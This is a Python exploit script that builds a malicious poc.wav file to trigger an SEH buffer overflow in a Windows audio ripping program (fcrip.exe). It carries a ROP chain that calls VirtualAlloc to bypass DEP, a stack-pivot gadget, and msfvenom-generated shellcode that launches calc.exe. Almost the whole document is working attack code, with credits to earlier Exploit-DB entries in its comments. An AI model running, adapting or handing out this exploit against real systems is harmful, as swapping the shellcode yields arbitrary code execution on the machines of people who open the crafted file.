#!/usr/bin/python

# original p0c https://www.exploit-db.com/exploits/36465/
# credit to TUNISIAN CYBER
# modified SEH Exploit https://www.exploit-db.com/exploits/36826/
# credit to ThreatActor at CoreRed.com
# Software Link: https://www.exploit-db.com/apps/64215b82be8bb2e749f95fec5b51d3e4-FMCRSetup.exe

# Tested on: Windows 7 Ultimate X64
# Added DEP Bypass to the exploit
# naxxo (head@gmail.com)


import struct

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x004103fe,  # POP EAX # RETN [fcrip.exe] 
      0x004e91f4,  # ptr to &VirtualAlloc() [IAT fcrip.exe]
      0x00418ff8,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [fcrip.exe] 
      0x00446c97,  # PUSH EAX # POP ESI # POP EBX # RETN [fcrip.exe] 
      0x41414141,  # Filler (compensate)
      0x6f4811f8,  # POP EBP # RETN [vorbisfile.dll] 
      0x1000c5ce,  # & push esp # ret  [libFLAC.dll]
      0x00415bfb,  # POP EBX # RETN [fcrip.exe] 
      0x00000001,  # 0x00000001-> ebx
      0x00415828,  # POP EDX # RETN [fcrip.exe] 
      0x00001000,  # 0x00001000-> edx
      0x10005f62,  # POP ECX # RETN [libFLAC.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x00409967,  # POP EDI # RETN [fcrip.exe] 
      0x00412427,  # RETN (ROP NOP) [fcrip.exe]
      0x00494277,  # POP EAX # RETN [fcrip.exe] 
      0x90909090,  # nop
      0x004c8dc0,  # PUSHAD # RETN [fcrip.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

# msfvenom -p windows/exec CMD=calc.exe -f python -b '\x00\xff\x0a\x0d'
shellcode =  ""
shellcode += "\xbf\xaa\x7e\xf4\xa0\xd9\xec\xd9\x74\x24\xf4\x5a\x33"
shellcode += "\xc9\xb1\x31\x83\xc2\x04\x31\x7a\x0f\x03\x7a\xa5\x9c"
shellcode += "\x01\x5c\x51\xe2\xea\x9d\xa1\x83\x63\x78\x90\x83\x10"
shellcode += "\x08\x82\x33\x52\x5c\x2e\xbf\x36\x75\xa5\xcd\x9e\x7a"
shellcode += "\x0e\x7b\xf9\xb5\x8f\xd0\x39\xd7\x13\x2b\x6e\x37\x2a"
shellcode += "\xe4\x63\x36\x6b\x19\x89\x6a\x24\x55\x3c\x9b\x41\x23"
shellcode += "\xfd\x10\x19\xa5\x85\xc5\xe9\xc4\xa4\x5b\x62\x9f\x66"
shellcode += "\x5d\xa7\xab\x2e\x45\xa4\x96\xf9\xfe\x1e\x6c\xf8\xd6"
shellcode += "\x6f\x8d\x57\x17\x40\x7c\xa9\x5f\x66\x9f\xdc\xa9\x95"
shellcode += "\x22\xe7\x6d\xe4\xf8\x62\x76\x4e\x8a\xd5\x52\x6f\x5f"
shellcode += "\x83\x11\x63\x14\xc7\x7e\x67\xab\x04\xf5\x93\x20\xab"
shellcode += "\xda\x12\x72\x88\xfe\x7f\x20\xb1\xa7\x25\x87\xce\xb8"
shellcode += "\x86\x78\x6b\xb2\x2a\x6c\x06\x99\x20\x73\x94\xa7\x06"
shellcode += "\x73\xa6\xa7\x36\x1c\x97\x2c\xd9\x5b\x28\xe7\x9e\x94"
shellcode += "\x62\xaa\xb6\x3c\x2b\x3e\x8b\x20\xcc\x94\xcf\x5c\x4f"
shellcode += "\x1d\xaf\x9a\x4f\x54\xaa\xe7\xd7\x84\xc6\x78\xb2\xaa"
shellcode += "\x75\x78\x97\xc8\x18\xea\x7b\x21\xbf\x8a\x1e\x3d"



junk = "A" * 3812
junk+= rop_chain + "\x90" * (308-len(rop_chain)-len(shellcode)) + shellcode

seh  = "\xd8\x2a\x9d\x63" # 0x639d2ad8 : {pivot 1132 / 0x46c} :  # ADD ESP,45C # XOR EAX,EAX # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [vorbis.dll] **   |   {PAGE_EXECUTE_READ}
 

buffer = junk + seh + "\x90" * 800


file = "poc.wav"
f=open(file,"w")
f.write(buffer);
f.close();
